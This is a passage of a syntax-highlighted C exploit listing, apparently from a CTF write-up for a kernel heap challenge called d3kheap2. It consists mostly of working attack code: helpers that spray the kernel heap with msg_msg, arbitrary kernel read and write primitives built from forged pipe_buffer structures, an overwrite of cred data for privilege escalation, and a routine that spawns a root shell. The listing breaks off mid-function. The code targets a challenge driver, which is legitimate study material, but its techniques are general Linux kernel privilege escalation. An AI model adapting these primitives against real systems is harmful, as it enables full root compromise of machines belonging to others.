class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Kernel Pwn Infrastructures</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    <span class="string">&quot;\033[32m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       <span class="string">&quot;\033[34m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      <span class="string">&quot;\033[31m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KASLR_GRANULARITY 0x10000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KASLR_MASK (~(KASLR_GRANULARITY - 1))</span></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>, vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(ERROR_MSG(<span class="string">&quot;[x] Error at: &quot;</span>) <span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[*] Process binded to core &quot;</span>) <span class="string">&quot;%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] Failed to get the root!&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_success(<span class="string">&quot;[+] Successful to get the root.&quot;</span>);</span><br><span class="line">    log_info(<span class="string">&quot;[*] Execve root shell now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of potential segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read start from len to offset, write start from offset */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> usage;</span><br><span class="line">    <span class="type">uint32_t</span> uid;</span><br><span class="line">    <span class="type">uint32_t</span> gid;</span><br><span class="line">    <span class="type">uint32_t</span> suid;</span><br><span class="line">    <span class="type">uint32_t</span> sgid;</span><br><span class="line">    <span class="type">uint32_t</span> euid;</span><br><span class="line">    <span class="type">uint32_t</span> egid;</span><br><span class="line">    <span class="type">uint32_t</span> fsuid;</span><br><span class="line">    <span class="type">uint32_t</span> fsgid;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_msg_queue</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">write_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MSG_COPY</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">peek_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, </span><br><span class="line">                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Challenge Interface</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> D3KHEAP2_OBJ_ALLOC  0x3361626e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> D3KHEAP2_OBJ_FREE   0x74747261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> D3KHEAP2_OBJ_EDIT   0x54433344</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> D3KHEAP2_OBJ_SHOW   0x4e575046</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">d3kheap2_ureq</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">d3kheap2_alloc</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3kheap2_ureq</span> <span class="title">ureq</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, D3KHEAP2_OBJ_ALLOC, &amp;ureq);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">d3kheap2_free</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3kheap2_ureq</span> <span class="title">ureq</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, D3KHEAP2_OBJ_FREE, &amp;ureq);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">d3kheap2_edit</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3kheap2_ureq</span> <span class="title">ureq</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, D3KHEAP2_OBJ_EDIT, &amp;ureq);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">d3kheap2_show</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3kheap2_ureq</span> <span class="title">ureq</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, D3KHEAP2_OBJ_SHOW, &amp;ureq);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Exploitation procedure</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> D3KHEAP2_BUF_NR 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> D3KHEAP2_OBJ_SZ 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_2K_OBJ_PER_SLUB 16</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NR 0x400</span></span><br><span class="line"><span class="comment">/* it cannot be big because the system limits that */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_SPRAY_NR 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_SCAVENGER_SZ (D3KHEAP2_OBJ_SZ - 0x30)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_SPRAY_SZ (0x1000 - 0x30 + D3KHEAP2_OBJ_SZ - 8)</span></span><br><span class="line"><span class="comment">/* prepare_copy() will do allocation, so we use bigger size for msg_msgseg */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_PEEK_SZ (0x1000 - 0x30 + 0x1000 - 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG_BASE 0x3361626e74747261</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_FCNTL_SZ (0x1000 * 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NR 0x180</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">fake_pipe_buf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">pipe_ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> pipe_flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pipe_private;</span><br><span class="line"><span class="type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="number">2</span>], atk_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> victim_pipe, ovlp_pipe;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_read_by_pipe</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">size_t</span> page_addr,</span></span><br><span class="line"><span class="params">    <span class="type">void</span> *buf,</span></span><br><span class="line"><span class="params">    <span class="type">size_t</span> len,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> atk_msgq,</span></span><br><span class="line"><span class="params">    <span class="type">size_t</span> *msg_buf,</span></span><br><span class="line"><span class="params">    <span class="type">size_t</span> msgsz,</span></span><br><span class="line"><span class="params">    <span class="type">long</span> msgtyp</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (read_msg(atk_msgq, msg_buf, msgsz, msgtyp) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to read msg_msg and msg_msgseg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fake_pipe_buf = (<span class="keyword">struct</span> pipe_buffer*) &amp;msg_buf[<span class="number">511</span>];</span><br><span class="line">    fake_pipe_buf-&gt;page = (<span class="keyword">struct</span> page*) page_addr;</span><br><span class="line">    fake_pipe_buf-&gt;len = <span class="number">0xff8</span>;</span><br><span class="line">    fake_pipe_buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    fake_pipe_buf-&gt;flags = pipe_flags;</span><br><span class="line">    fake_pipe_buf-&gt;ops = pipe_ops;</span><br><span class="line">    fake_pipe_buf-&gt;private = pipe_private;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    for (int i = 0; i &lt; 0x80; i++) &#123;</span></span><br><span class="line"><span class="comment">        char ch[8];</span></span><br><span class="line"><span class="comment">        for (int j = 0; j &lt; 8; j++) &#123;</span></span><br><span class="line"><span class="comment">            ch[j] = &#x27;A&#x27; + i;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        msg_buf[500 + i] = *(size_t*) ch;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write_msg(atk_msgq, msg_buf, msgsz, msgtyp) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to allocate msg_msg to overwrite pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(atk_pipe[<span class="number">0</span>], buf, <span class="number">0xff0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[x] Unable to read from pipe&quot;</span>);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to read from evil pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_write_by_pipe</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">size_t</span> page_addr,</span></span><br><span class="line"><span class="params">    <span class="type">void</span> *buf,</span></span><br><span class="line"><span class="params">    <span class="type">size_t</span> len,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> atk_msgq,</span></span><br><span class="line"><span class="params">    <span class="type">size_t</span> *msg_buf,</span></span><br><span class="line"><span class="params">    <span class="type">size_t</span> msgsz,</span></span><br><span class="line"><span class="params">    <span class="type">long</span> msgtyp</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    fake_pipe_buf = (<span class="keyword">struct</span> pipe_buffer*) &amp;msg_buf[<span class="number">516</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read_msg(atk_msgq, msg_buf, msgsz, msgtyp) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to read msg_msg and msg_msgseg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fake_pipe_buf-&gt;page = (<span class="keyword">struct</span> page*) page_addr;</span><br><span class="line">    fake_pipe_buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">    fake_pipe_buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    fake_pipe_buf-&gt;ops = pipe_ops;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write_msg(atk_msgq, msg_buf, msgsz, msgtyp) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to allocate msg_msg to overwrite pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    len = len &gt; <span class="number">0xffe</span> ? <span class="number">0xffe</span> : len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(write(atk_pipe[<span class="number">1</span>], buf, len) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[x] Unable to write into pipe&quot;</span>);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to write into evil pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> D3KHEAP2_BUF_SPRAY_NR D3KHEAP2_BUF_NR</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">leak_pipe_buf</span>;</span></span><br><span class="line">    <span class="type">int</span> reclaim_msgq[MSG_QUEUE_NR], atk_msgq;</span><br><span class="line">    <span class="type">int</span> vuln_msgq[MSG_QUEUE_NR], evil_msgq[MSG_QUEUE_NR];</span><br><span class="line">    <span class="type">int</span> vulq_idx, vulm_idx, evilq_idx, evilm_idx, found;</span><br><span class="line">    <span class="type">size_t</span> pipe_spray_nr, msg_spray_nr;</span><br><span class="line">    <span class="type">int</span> d3kheap2_fd;</span><br><span class="line">    <span class="type">char</span> err_msg[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>], msg_buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> kernel_leak, current_pcb_page, *comm_addr;</span><br><span class="line">    <span class="type">uint32_t</span> uid, gid;</span><br><span class="line">    <span class="type">uint64_t</span> cred_kaddr, cred_kpage_addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred_data</span>;</span></span><br><span class="line">    <span class="type">char</span> cred_data_buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">int</span> errno;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rl</span>;</span></span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Preparing env...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    rl.rlim_cur = <span class="number">4096</span>;</span><br><span class="line">    rl.rlim_max = <span class="number">4096</span>;</span><br><span class="line">    <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rl) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[x] setrlimit&quot;</span>);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to expand file descriptor&#x27;s limit!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    d3kheap2_fd = open(<span 